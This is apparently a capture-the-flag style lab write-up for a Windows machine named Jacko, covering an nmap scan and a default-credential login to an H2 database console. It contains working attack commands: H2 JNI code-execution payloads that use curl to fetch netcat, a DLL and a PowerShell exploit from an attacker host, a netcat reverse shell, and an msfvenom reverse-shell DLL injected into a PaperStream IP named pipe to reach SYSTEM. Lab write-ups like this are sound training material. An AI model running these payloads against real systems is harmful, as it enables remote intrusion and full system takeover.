#box #JNI #hs-database-engine #RCE #msfvenom #DLL-injection
 
Jacko in an interesting machine involving a vulnerability in the JNI (Java Native Interface) that can be interacted with throughout H2 Database 1.4.199, a Java-based SQL Engine. From H2 it's possible to set up a JNI instance to write, load and run a command of choice all from the H2 Database Engine. Once inside the target machine, we notice that we have the SeImpersonatePrivilege, however, all our tries to execute PrintSpoofer or JuicyPotato fails due to the impossibility to create a new session as SYSTEM. We discover at the end the presence of a process called FJTWSVIC that resembles to PaperStream IP which appears to be vulnerable to Code Execution throughout a named pipe that will escalate us to SYSTEM.

## Nmap

Our nmap scan reveals the following open ports:
```bash
# Nmap 7.95 scan initiated Sat Jun 14 16:12:07 2025 as: /usr/lib/nmap/nmap -sCV -vvv --min-rate=10000 -o nmap_sCVVVV 192.168.109.66
Increasing send delay for 192.168.109.66 from 0 to 5 due to 175 out of 582 dropped probes since last increase.
Increasing send delay for 192.168.109.66 from 5 to 10 due to 54 out of 179 dropped probes since last increase.
Increasing send delay for 192.168.109.66 from 10 to 20 due to 45 out of 148 dropped probes since last increase.
Nmap scan report for 192.168.109.66
Host is up, received echo-reply ttl 125 (0.043s latency).
Scanned at 2025-06-14 16:12:08 UTC for 17s
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 125
8082/tcp open  http          syn-ack ttl 125 H2 database http console
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods: 
|_  Supported Methods: GET POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58209/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33703/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25578/udp): CLEAN (Timeout)
|   Check 4 (port 37826/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-06-14T16:12:18
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 14 16:12:25 2025 -- 1 IP address (1 host up) scanned in 17.31 seconds
```

While we have no access to SMB, we opt for looking what's on port 80 and 8082

## HTTP

Port 80 shows the presence of a H2 Database Engine, port 8082 shows a login panel for the database engine. We figure out that the credentials `sa:{empty}` grants us access since they're the default authentication for H2.

Once inside, we reach a database engine which doesn't show any particular database except the usual INFORMATION_SCHEMA. We discover, by looking online, the following vulnerability [H2 Database 1.4.199 - JNI Code Execution](https://www.exploit-db.com/exploits/49384), for some reason it has no reference CVE.
We opt for executing the whole code in this exploit to successfully execute the `whoami` command on the target, figuring out the user in question `jacko\tony`.
![[attachments/jacko-writeup-1.webp]]

## Foothold

To obtain the foothold, there are different procedures. One could opt to leverage the SMB open ports to get a shell, I opted for transferring netcat with cURL on the target machine and then trigger a reverse shell to my attacking machine.
We first transfer nc64.exe to the target machine with:

```java
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl http://192.168.45.213:8000/nc64.exe -o C:/Users/tony/Desktop/nc.exe").getInputStream()).useDelimiter("\\Z").next()'); // Here we opt to put the nc into the user's Desktop because we were unable to create a new folder. We know for sure that this folder exists and we have write access to.
```

>Here, even though we receive an error on H2, we'll see how the transfer has occurred on our webserver, so we shall be able to point to the folder where we placed `nc` and use it.


Then we exec nc to connect to our attacking machine, on port 4444:

```java
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Users/tony/Desktop/nc.exe 192.168.45.213 4444 -e cmd").getInputStream()).useDelimiter("\\Z").next()');
```

and we can the foothold as `jacko\tony`.

## Privilege Escalation

Actually, on the target shell, we realize that most of the command doesn't work, so we keep relying on the previous vulnerability to execute some commands, such as `systeminfo`, `tasklist`, `netstat` etc. After looking for privilege escalation vectors such as PrintSpoofer or JuicyPotato (since we've the SeImpersonatePrivilege right), we realize that both of them doesn't work for some reason, even though it seems everything is in place for them to work. We find out a strange task running on the target called `FJTWSVIC`.

By looking online, we realize that this process refers to PaperStream IP (TWAIN) and that its version 1.42.0.5685 is vulnerable to a Privilege Escalation attack. It consists in a dll injection onto FjtwMkic_Fjicube_32 pipe that will then execute our malicious payload and grant us SYSTEM.

We first download [this](https://www.exploit-db.com/exploits/49382) script on our machine and by reading it we realize that a payload must be built with msfvenom. By trying a few combinations, we discover that the following payload works as intended, and grants us the shell.

```bash
msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.213 LPORT=4445
```

So we first build the dll file and then transfer it to the target machine with cURL.
Since curl is not working on the shell we've obtained, we're going to trigger it through the previous exploit on H2

```java
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl http://192.168.45.213:8000/shell.dll -o C:/Temp/shell.dll").getInputStream()).useDelimiter("\\Z").next()');
```

Once transferred, we shall also transfer the ps1 script we've previously downloaded on our machine:

```java
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl http://192.168.45.213:8000/49382 -o C:/Temp/49382.ps1").getInputStream()).useDelimiter("\\Z").next()');
```

We then run the ps1 script on powershell and catch the new session on port 4445 as specified on the `msfvenom` command above.

```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe .\49382.ps1
```

Obtaining System

![[attachments/jacko-writeup-2.webp]]